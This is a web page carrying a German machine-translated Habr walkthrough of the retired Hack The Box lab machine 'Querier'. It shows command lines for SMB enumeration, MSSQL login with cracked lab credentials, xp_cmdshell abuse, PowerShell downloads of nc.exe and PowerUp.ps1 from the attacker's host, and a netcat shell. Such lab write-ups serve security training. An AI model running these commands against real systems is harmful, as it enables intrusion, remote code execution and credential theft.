<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>💷 ♻️ 🦒 Der Durchgang der Labormaschine zum Pentest "Hackthebox - Querier" 🤟🏿 👵🏽 🧑🏾‍🤝‍🧑🏼</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Hallo Habr! In diesem Artikel erfahren Sie, wie Sie einen Remoteserver mithilfe der Funktionen von MsSQL angreifen, eine Reverse Shell zum Beheben im ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Der Durchgang der Labormaschine zum Pentest "Hackthebox - Querier"</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/post/465687/">  Hallo Habr!  In diesem Artikel erfahren Sie, wie Sie einen Remoteserver mithilfe der Funktionen von MsSQL angreifen, eine Reverse Shell zum Beheben im System erstellen und ein Beispiel für die Ausführung einer schlecht konfigurierten Gruppenrichtlinie in Windows geben. <br><a name="habracut"></a><br>  Im Rahmen des Schnitts werden wir über unsere Erfahrungen mit der Übergabe der <i>Querier-Labormaschine</i> auf dem <i>Hackthebox-</i> Portal <i>sprechen</i> . <br><br>  Für diejenigen, die nicht wissen, was Hackthebox ist, ist dies ein Portal, auf dem Sie Ihre Pentest-Fähigkeiten in der Praxis testen können. Es gibt CTF-Aufgaben und Labormaschinen selbst. <br><br><div class="spoiler"> <b class="spoiler_title">Haftungsausschluss</b> <div class="spoiler_text">  Die Regeln des Dienstes lauten: " <b>Teilen Sie nicht mit anderen Mitgliedern, wie Sie jeden Computer gehackt haben.</b>  <b>Dies beinhaltet die Generierung des Einladungscodes und alle Herausforderungen</b> . "  Da diese Maschine jedoch nicht mehr aktiv ist und im Bereich <b>Maschinen</b> im <b>Ruhestand</b> gespeichert ist, können nur VIP-Mitglieder darauf zugreifen. <br></div></div><br><img src="https://habrastorage.org/webt/vq/ed/2p/vqed2pfxflqjfxvcwxqwoxlepjw.png"><br><br><h3>  Informationsbeschaffung </h3><br>  Beginnen wir unsere Erkundung, indem wir das Port-Scannen mit nmap starten. <br><br><pre><code class="plaintext hljs">nmap –sC –Pn –A 10.10.10.125</code> </pre> <br><img src="https://habrastorage.org/webt/ww/cq/cs/wwcqcsox6nngnzfkvkpgiyq07si.png"><br><br>  Wir listen die gefundenen Ports auf. <br><br><h3>  Zählen Sie 139/445 / tcp (smb) auf </h3><br>  Wir werden das Dienstprogramm smbclient verwenden, um auf SMB-Serverressourcen zuzugreifen. <br><br><pre> <code class="plaintext hljs">smbclient –L //10.10.10.125</code> </pre> <br>  Nachdem wir alle Ressourcen durchgesehen haben, finden wir im Verzeichnis "Berichte" die Datei "Currency Volume Report.xlsm". <br><br><img src="https://habrastorage.org/webt/op/c9/ap/opc9ap3a8hqwhveqvzz-xdh5e3i.png"><br><br>  Wenn Sie diese Datei mit Standard-Microsoft Excel öffnen, <s>erscheint sie auf den ersten Blick</s> völlig leer. <br><br>  Wir analysieren die Datei mit dem Dienstprogramm <b><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">binwalk</a></b> , mit dem Sie die eingebetteten Dateien des xlsm-Dokuments anzeigen können. <br><br><img src="https://habrastorage.org/webt/or/d3/de/ord3deo3azftc6ez9qpzmvitgje.png"><br><br>  Aus der Ausgabe von binwalk haben wir einige interessante Dateien in xlsm gefunden. <br>  Packen Sie es mit dem Flag –e aus. <br><br><pre> <code class="plaintext hljs">binwalk –e Currency\ Volume\ Report.xlsm</code> </pre> <br><img src="https://habrastorage.org/webt/wi/vu/bq/wivubqmptbuto-wxlhlbyy58jh4.png"><br><br>  Jetzt verwenden wir das <b><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Zeichenfolgen-</a></b> Dienstprogramm, um gedruckte Zeichen auszugeben.  Beim Durchgehen der Dateien finden wir interessante Daten in vbaProject.bin.  Es sieht so aus, als hätten wir die Anmeldeinformationen für den MSSQL-Server gefunden. <br><br><img src="https://habrastorage.org/webt/am/8q/bx/am8qbx-ummecwgqgeewiixoy_sw.png"><br><br>  Um die aktuell erhaltenen Informationen zusammenzufassen: <br><br><ul><li>  Wir wissen, dass sich der mssql-Server auf dem Port 10.10.10.125:1433 dreht. </li><li>  Wir haben Anmeldeinformationen vom Benutzer mssql Server. </li></ul><br>  Versuchen wir also, mithilfe des Skripts aus dem <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Impacket-</a> Modul eine Verbindung zum Server <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">herzustellen</a> . <br><br><pre> <code class="plaintext hljs">python mssqlclient.py QUERIER/reporting:'PcwTWTHRwryjc$c6'@10.10.10.125 -windows-auth</code> </pre> <br>  Erhalten Sie Zugriff auf MsSQL. <br><br><img src="https://habrastorage.org/webt/2j/ff/ft/2jffftgea-_n4gr5ydykaye7epo.jpeg"><br><br><h3>  Zählen Sie MsSQL auf </h3><br>  Wir listen die Informationen auf, die für uns nützlich sind, indem wir die Befehle aus dem <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Artikel verwenden</a> . <br>  Nach der Ausführung von SQLi erhalten wir einen Hash aus dem Passwort des Benutzers mssql-svc. <br><br><img src="https://habrastorage.org/webt/bs/d8/y2/bsd8y2jtdscxcuplenw3zctddsq.png"><br><br>  Um das Passwort explizit zu erhalten, müssen Sie es mit einem für Sie geeigneten Tool entfernen. <br><br><ol><li><pre> <code class="plaintext hljs">john --format=netntlmv2 hash.txt</code> </pre> </li><li><pre> <code class="plaintext hljs">hashcat -m 5600 -a 3 hash.txt</code> </pre> </li></ol><br>  <i>Wir bekommen das Passwort von mssql-svc</i> . <br><br>  Herstellen einer Verbindung zu SQL mit neuen <s>Krediten</s> . <br><br><pre> <code class="plaintext hljs">python mssqlclient.py QUERIER/mssql-svc:'corporate568'@10.10.10.125 -windows-auth</code> </pre> <br>  Die Rechte dieses Benutzers ermöglichen es uns, <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">xp_cmdshell</a> auszuführen <br><br><div class="spoiler">  <b class="spoiler_title">Über xp_cmdshell</b> <div class="spoiler_text">  MsSQL wird mit einer großen Anzahl erweiterter gespeicherter Prozeduren geliefert.  Das interessanteste davon ist xp_cmdshell.  Es bietet Zugriff auf die Befehlszeile des Betriebssystems. <br></div></div><br><h3>  Holen Sie sich die umgekehrte Shell </h3><br>  Wir versuchen, die Shell über Netcat zu bekommen. Dazu müssen wir sie auf den angegriffenen Server hochladen. <br><br>  Wir gehen in das Verzeichnis auf unserem Computer, in dem sich netcat befindet, und führen Folgendes aus: <br><br><pre> <code class="plaintext hljs">python –m SimpleHTTPServer</code> </pre> <br>  Führen Sie in der mssql-Shell zum Herunterladen von netcat (nc.exe) auf den Remote-Server den Befehl Powershell aus und geben Sie den Speicherpfad an. <br><br><pre> <code class="plaintext hljs">xp_cmdshell "powershell.exe Invoke-WebRequest "http://10.10.xx:8000/nc.exe" – OutFile "C:\Users\mssql-svc\Desktop\nc.exe" "</code> </pre><br>  Wir starten netcat, um Port 4444 abzuhören. <br><br><pre> <code class="plaintext hljs">xp_cmdshell "powershell C:/Users/mssql-svc/Desktop/nc.exe -l -p 4444 -e cmd.exe"</code> </pre> <br>  Wir starten netcat auf unserer Seite, geben die IP und den Port des angegriffenen Servers an und erhalten die Shell. <br><br><pre> <code class="plaintext hljs">nc 10.10.10.125 4444</code> </pre> <br>  Führen Sie ein <a href="">Skript in PowerShellMafia aus</a> , um die Berechtigungen zu erhöhen. <br><br><pre> <code class="plaintext hljs">powershell.exe IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.xx:8000/PowerUp.ps1\"); Invoke-AllChecks</code> </pre> <br><img src="https://habrastorage.org/webt/2g/ae/ty/2gaety4o2quiuqhbyste0mxcwma.png"><br><br>  Als Ergebnis des Skripts haben wir die Administratoranmeldeinformationen erhalten. <br><br>  Wir gehen zu jd-Ressourcen mit neuen Anmeldeinformationen und Berechtigungen. <br><br><img src="https://habrastorage.org/webt/eg/sd/0q/egsd0qbpbkjkozjcu_e_qfxkujw.png"><br><br><img src="https://habrastorage.org/webt/vr/wb/w6/vrwbw6u9vmdn5af2zcyld-uoz60.png"><br><br>  Nehmen Sie das Flag root.txt.  Sieg! </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/de465687/">https://habr.com/ru/post/de465687/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../de465677/index.html">Vergessen Sie den Walkman: Es geht nur um die Kopfhörer</a></li>
<li><a href="../de465679/index.html">Was kann eine Uhr neben der Zeitanzeige tun und wie wählt man die erste Uhr aus?</a></li>
<li><a href="../de465681/index.html">Wie das Knistern eines Feuers werden das Knarren von Türen und das gewöhnlichste Geräusch zu Musik und fallen in elektroakustische Spuren</a></li>
<li><a href="../de465683/index.html">Der Fluch des Kinos: Wer ist mit der Bewegungsglättung im modernen Fernsehen unzufrieden - wie entwickelt sich die Situation?</a></li>
<li><a href="../de465685/index.html">Reagieren Sie auf Best Practices und Tipps, die jeder Entwickler kennen sollte. Teil 1</a></li>
<li><a href="../de465689/index.html">Russian Railway Simulator (RRS): erste Veröffentlichung</a></li>
<li><a href="../de465691/index.html">Verwenden von REST in ENM Ericsson in Python</a></li>
<li><a href="../de465703/index.html">So erzielen Sie über die Börse zusätzliche Einnahmen für das Unternehmen: Investitionen in Strukturprodukte</a></li>
<li><a href="../de465709/index.html">JustCode - ein Hochgeschwindigkeitsbrowser für preisgünstige Computer und Tablets unter Windows</a></li>
<li><a href="../de465711/index.html">Wie die DSGVO zu Datenlecks führte</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>